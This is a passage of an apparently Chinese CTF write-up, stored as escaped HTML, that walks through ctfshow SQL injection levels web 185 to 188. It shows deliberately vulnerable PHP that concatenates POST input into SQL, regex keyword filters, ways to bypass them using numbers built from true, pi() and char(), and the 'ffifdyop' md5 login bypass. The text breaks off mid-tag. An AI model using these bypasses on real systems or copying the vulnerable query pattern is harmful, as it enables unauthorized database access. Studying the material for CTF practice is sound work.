data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 查询结果&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 返回用户表的记录总数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$user_count&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;web-185&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-185&#34;&gt;#&lt;/a&gt; web 185&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select count(*) from &#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tableName&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 对传入的参数进行了过滤&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 返回用户表的记录总数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$user_count&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以看到，相比上题，这题多过滤了数字，如果要用之前的十六进制，分别需要获取数字 0-9 和字母 x，A,B,C,D,E,F&lt;/p&gt;
&lt;p&gt;对于数字，在 SQL 中可以利用以下来获取&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;true 1
false 0
select true;   --&amp;gt;    1
select false;   --&amp;gt;    0
slect true+true; --&amp;gt;    2

//同时也可以利用ceil，floor来获取如pi(),version()中的数据
select pi();    --&amp;gt; 3.141593
select floor(pi());   --&amp;gt; 3
select ceil(pi());    --&amp;gt; 4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里已经想到办法获得数字了，下面是字母的获取，这里可以使用 char&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;select char(97);  --&amp;gt;  &#39;a&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;于是字母数字均获得，下面是两种思路&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;利用 substr/left/right 函数，截取字符串，其截取位置和长度可由 &lt;code&gt;true&lt;/code&gt;  来生成，然后使用前面一样的 regexp 进行匹配，其中一种是使用 concat 和 char 连接字符串，一种是只截取一位然后一位一位匹配&lt;/li&gt;
&lt;li&gt;利用 UNHEX 和 concat 函数，其中 concat 用来连接字母数字成十六进制字符串，UNHEX 用来对十六进制进行解码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面针对第一个编写脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-186&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-186&#34;&gt;#&lt;/a&gt; web 186&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select count(*) from &#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;tableName&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 对传入的参数进行了过滤&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;waf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&amp;lt;|\&amp;gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&#34;|union|\`|sleep|benchmark/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 返回用户表的记录总数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token variable&#34;&gt;$user_count&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;相比之前过滤了 &lt;code&gt;%&amp;lt;&amp;gt;^&lt;/code&gt; ，无影响，继续使用上题脚本&lt;/p&gt;
&lt;h1 id=&#34;web-187&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-187&#34;&gt;#&lt;/a&gt; web 187&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select count(*) from ctfshow_user where username = &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;/span&gt;&#39; and password= &#39;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;/span&gt;&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;// 只有 admin 可以获得 flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;admin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;用户名不存在&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;经典 md5，输入用户名 &lt;code&gt;admin&lt;/code&gt; ，密码 &lt;code&gt;ffifdyop&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;md5(&#39;ffifdyop&#39;)=276f722736c95d99e921722cf9ed621c&lt;/p&gt;
&lt;p&gt;将其作为十六进制再解码后，可以得到 &lt;code&gt;&#39;or&#39; 6xxxx&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-188&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-188&#34;&gt;#&lt;/a&gt; web 188&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 拼接 sql 语句查找指定 ID 用户&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;select pass from ctfshow_user where username = &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token comment&#34;&gt;// 用户名检测&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#39;|\&#34;/i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;用户名非法&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token comment&#34;&gt;// 密码检测&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;is_numeric&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;msg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;密码只能为数字&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;json_encode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$ret&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token comment&#34;&gt;// 密码判断&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$row&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;pass&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;token 